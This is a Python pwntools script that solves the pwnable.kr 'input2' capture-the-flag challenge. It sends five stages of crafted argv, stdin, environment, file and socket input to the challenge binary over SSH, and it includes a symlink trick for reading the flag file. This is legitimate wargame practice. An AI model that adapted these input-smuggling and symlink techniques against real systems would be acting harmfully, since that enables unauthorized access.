import socket
import random
from pwn import *
from py_console import console

console.error("""
Before running run these in pwnable.kr's ssh terminal:
mkdir /tmp/<directory-name>  
cd /tmp/<directory-name>
ln -s /tmp/<directory-name> /home/input2/flag  # Becase we're cwd`ing to /tmp/<directory-name> we wanna be able to read the flag
python3
Python 3.5.2 (default, Jan 26 2021, 13:30:48)
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> with open("\x0a", "+w") as fd: # Stage 4
...     fd.write("\x00\x00\x00\x00")
              """)

tmp = input("default: hax")
if tmp == '\n':
    tmp = "hax"

PORT = random.randrange(1000,65000)
SERVER = "pwnable.kr"
AADR = (SERVER, PORT)

USER = "input2"
PASSWORD = 'guest'
H4X = f"/tmp/{tmp}" # Stage 5
EXE_PATH = '/home/input2/input'
ENV_VARS = {"\xde\xad\xbe\xef" : "\xca\xfe\xba\xbe"}

# Stage 1
argv_str = "cccc "*99
argv = argv_str.split(" ")
argv[65] = "\x00"
argv[66] = "\x20\x0a\x0d"
argv[67] = str(PORT) # Stage 5

shell = ssh(host=SERVER, user=USER, password=PASSWORD, port=2222)
p = shell.process(cwd=H4X, executable=EXE_PATH, argv=argv, env=ENV_VARS)

console.info(p.recvuntil(":)\n").decode())
console.success(p.recvline().decode())

# Stage 2
p.send(b"\x00\x0a\x00\xff")
p.send(b"\x00\x0a\x02\xff")
console.success(p.recvline().decode())

# Stage 3
console.success(p.recvline().decode())

# Stage 4
console.success(p.recvline().decode())

# Stage 5
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(AADR)
sock.send(b"\xde\xad\xbe\xef")
console.success(p.recvline().decode())
console.success(p.recvline().decode())

